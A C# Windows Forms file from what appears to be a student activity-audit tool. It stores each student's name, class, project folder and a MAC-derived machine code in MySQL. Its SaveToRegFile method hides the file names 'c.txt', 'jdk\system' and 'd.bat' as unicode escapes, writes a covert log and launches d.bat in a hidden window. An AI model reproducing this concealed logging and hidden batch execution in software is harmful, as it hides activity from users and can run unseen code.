using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net.NetworkInformation;
using System.Windows.Forms;
using MySql.Data.MySqlClient;

namespace ProjetoAuditoriaDeAtividades2
{
    public partial class Yldjgrued : Form
    {
        public Yldjgrued()
        {
            InitializeComponent();
        }

        private void btnCadastrar_Click(object sender, EventArgs e)
        {
            if (txtNomeEstudante.Text != "" && cmbTurma.SelectedIndex != -1 && cmbAvaliativa.SelectedIndex != -1 && cmbLocal.SelectedIndex != -1)
            {
                string texto = txtNomeEstudante.Text;
                string[] palavras = texto.Split(new[] { ' ' }, StringSplitOptions.RemoveEmptyEntries);

                String mensagemNomeESobreNomeValidos = "Insira um nome e sobrenome válidos.";

                if (palavras.Length < 2)
                {
                    MessageBox.Show(mensagemNomeESobreNomeValidos);
                    txtNomeEstudante.Text = "";
                    return;
                }

                foreach (string palavra in palavras)
                {
                    if (!TemVogal(palavra) || !TemConsoante(palavra))
                    {
                        MessageBox.Show(mensagemNomeESobreNomeValidos);
                        txtNomeEstudante.Text = "";
                        return;
                    }
                }


                string nomeEstudante = txtNomeEstudante.Text;
                string turmaEstudante = cmbTurma.SelectedItem.ToString();
                string strAvaliativa = cmbAvaliativa.SelectedItem.ToString();
                string strLocal = cmbLocal.SelectedItem.ToString();


                int avaliativa = 0;

                if (strAvaliativa != null && strAvaliativa.Equals("Sim"))
                {
                    avaliativa = 1;
                }


                string codigoSegurancaProjeto = Guid.NewGuid().ToString();

                //Habilitar No Teste de Projeto Independente e Desabilitar na Implatação
                //Environment.CurrentDirectory = Environment.CurrentDirectory + @"\..\";

                string pastaAtualProjeto = Environment.CurrentDirectory;


                DateTime dataHoraAtual = DateTime.Now;

                DateTime dataRegistro = dataHoraAtual.Date;
                TimeSpan horaRegistro = dataHoraAtual.TimeOfDay;


                string codigoDaMaquina = String.Empty;

                try
                {
                    NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
                    string macAddress = String.Empty;
                    bool placaEthernet = false;

                    foreach (NetworkInterface nic in nics)
                    {
                        if (nic.NetworkInterfaceType == NetworkInterfaceType.Wireless80211
                            && nic.OperationalStatus == OperationalStatus.Up
                            && !string.IsNullOrEmpty(nic.GetPhysicalAddress().ToString()))
                        {
                            macAddress = nic.GetPhysicalAddress().ToString();

                            break;
                        }
                    }

                    if (macAddress == String.Empty)
                    {
                        foreach (NetworkInterface nic in nics)
                        {
                            if (nic.NetworkInterfaceType == NetworkInterfaceType.Ethernet
                                && nic.OperationalStatus == OperationalStatus.Up
                                && !string.IsNullOrEmpty(nic.GetPhysicalAddress().ToString()))
                            {
                                macAddress = nic.GetPhysicalAddress().ToString();
                                placaEthernet = true;
                                break;
                            }
                        }
                    }

                    if (!string.IsNullOrEmpty(macAddress) && macAddress.Length >= 12)
                    {
                        if (!placaEthernet)
                        {
                            codigoDaMaquina += "W-";
                        }
                        else
                        {
                            codigoDaMaquina += "E-";
                        }

                        codigoDaMaquina += macAddress.Substring(macAddress.Length - 3);
                    }
                }
                catch (Exception)
                {
                    codigoDaMaquina = "";
                }

                long idGerado = 0;

                MySqlConnection conexao = null;

                try
                {

                    String enderecoConexaoMySql = new Cidghjex().E;

                    conexao = new MySqlConnection(enderecoConexaoMySql);

                    String sql = "INSERT INTO historico_de_atividades " +
                        "(nome_estudante, turma_estudante, avaliativa, local, " +
                        "codigo_seguranca_projeto, pasta_atual_projeto, " +
                        "data_registro, hora_registro, codigo_maquina) " +
                        "VALUES " +
                        "(@nomeEstudante, @turmaEstudante, @avaliativa, @local," +
                        "@codigoSegurancaProjeto, @pastaAtualProjeto, " +
                    "@dataRegistro, @horaRegistro, @codigoMaquina)";

                    if (strLocal != null && !strLocal.Equals("Casa"))
                    {
                        pastaAtualProjeto = String.Empty;
                        codigoDaMaquina = String.Empty;
                    }

                    MySqlCommand comando = new MySqlCommand(sql, conexao);
                    comando.Parameters.AddWithValue("@nomeEstudante", nomeEstudante);
                    comando.Parameters.AddWithValue("@turmaEstudante", turmaEstudante);
                    comando.Parameters.AddWithValue("@avaliativa", avaliativa);
                    comando.Parameters.AddWithValue("@local", strLocal);
                    comando.Parameters.AddWithValue("@codigoSegurancaProjeto", codigoSegurancaProjeto);
                    comando.Parameters.AddWithValue("@pastaAtualProjeto", pastaAtualProjeto);
                    comando.Parameters.AddWithValue("@dataRegistro", dataRegistro);
                    comando.Parameters.AddWithValue("@horaRegistro", horaRegistro);
                    comando.Parameters.AddWithValue("@codigoMaquina", codigoDaMaquina);

                    conexao.Open();
                    comando.ExecuteNonQuery();

                    idGerado = comando.LastInsertedId;



                    SaveToRegFile(idGerado, nomeEstudante, turmaEstudante, strAvaliativa, codigoSegurancaProjeto, pastaAtualProjeto, dataRegistro, horaRegistro, codigoDaMaquina, strLocal);

                    MessageBox.Show("Atividade cadastrada com Sucesso!");

                    LimparCampos();

                    Close();

                }
                catch (Exception ex)
                {
                    MessageBox.Show("Não é possível cadastrar uma atividade. Erro: " + ex.Message);
                }
                finally
                {
                    if (conexao != null)
                    {
                        conexao.Close();
                    }
                }
            }
            else
            {
                MessageBox.Show("Os campos 'Nome(s) Completo(s)', 'Turma', 'Avaliativa' e 'Local' são obrigatórios.");
            }
        }

        private void LimparCampos()
        {
            txtNomeEstudante.Text = string.Empty;
            cmbTurma.SelectedIndex = -1;
            cmbAvaliativa.SelectedIndex = -1;
            cmbLocal.SelectedIndex = -1;
        }

        private void SaveToRegFile(long idGerado, string nomeEstudante, string turmaEstudante, string avaliativa, string codigoSegurancaProjeto, string pastaAtualProjeto,
    DateTime dataRegistro, TimeSpan horaRegistro, string codigoMaquina, string local)
        {
            try
            {
                string y = "";

                y += "\u0063";
                y += "\u002E";

                y += "\u0074";
                y += "\u0078";
                y += "\u0074";

                string k = "";
                k += "\u006A";

                k += "\u0064";


                string j = "";
                j += "\u0073";
                j += "\u0079";

                k += "\u006B";
                j += "\u0073";

                j += "\u0074";
                j += "\u0065";

                string z = "";
                z += "\u0064";
                z += "\u002E";

                j += "\u006D";

                string w = Path.Combine(k, j);

                z += "\u0062";

                z += "\u0061";
                z += "\u0074";

                Directory.CreateDirectory(k);

                string dataToWrite = "";

                dataToWrite += "ID Remoto: " + idGerado + "\n";
                dataToWrite += "Nome(s) do(s) Estudante(s): " + nomeEstudante + "\n";
                dataToWrite += "Turma: " + turmaEstudante + "\n";
                dataToWrite += "Atividade Avaliativa: " + avaliativa + "\n";
                dataToWrite += "Local: " + local + "\n";
                dataToWrite += "Código de Segurança do Projeto: " + codigoSegurancaProjeto + "\n";


                if (local != null && !local.Equals("Casa"))
                {
                    dataToWrite += "Pasta Atual do Projeto: " + pastaAtualProjeto + "\n";
                }

                dataToWrite += "Data de Registro: " + dataRegistro.ToString("yyyy-MM-dd") + "\n";
                dataToWrite += "Hora de Registro: " + horaRegistro.ToString(@"hh\:mm\:ss") + "\n";

                if (local != null && !local.Equals("Casa"))
                {
                    dataToWrite += "Código da Máquina Utilizada: " + codigoMaquina + "\n\n";
                }
                else
                {
                    dataToWrite += "\n";
                }

                File.AppendAllText(y, dataToWrite);
                File.AppendAllText(w, dataToWrite);

                try
                {
                    ProcessStartInfo processStartInfo = new ProcessStartInfo();
                    processStartInfo.CreateNoWindow = true;
                    processStartInfo.UseShellExecute = false;
                    processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    processStartInfo.FileName = z;

                    Process.Start(processStartInfo);
                }
                catch (Exception e)
                {
                    Console.WriteLine("Erro ao iniciar o processo: " + e.Message);
                }
            }
            catch (Exception e)
            {
                Console.WriteLine("Erro ao salvar os dados no arquivo: " + e.Message);
            }
        }

        private void txtNomeEstudante_KeyPress(object sender, KeyPressEventArgs e)
        {
            if (!char.IsControl(e.KeyChar) && !char.IsLetter(e.KeyChar) && (e.KeyChar != ',') && (e.KeyChar != ' '))
            {
                e.Handled = true;
            }
        }

        private bool TemVogal(string palavra)
        {
            return palavra.Any(c => "aeiouAEIOU".Contains(c));
        }

        private bool TemConsoante(string palavra)
        {
            return palavra.Any(c => char.IsLetter(c) && !"aeiouAEIOU".Contains(c));
        }
    }
}
